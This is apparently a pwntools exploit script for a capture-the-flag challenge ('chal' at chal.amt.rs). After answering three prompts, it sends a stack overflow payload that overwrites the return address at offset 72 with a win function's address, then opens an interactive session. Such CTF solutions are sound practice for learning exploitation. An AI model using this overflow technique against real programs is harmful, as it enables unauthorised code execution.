#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
# libc = ELF("./libc.so.6", checksec = False)
# ld = ELF("./ld-2.27.so", checksec = False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

r.sendlineafter(b'FALKEN', b'test')
r.sendlineafter(b'?', b'test')
r.sendlineafter(b'?', b'test')

payload = flat({
    72: elf.sym['global_thermo_nuclear_war']
})

r.sendline(payload)

r.interactive()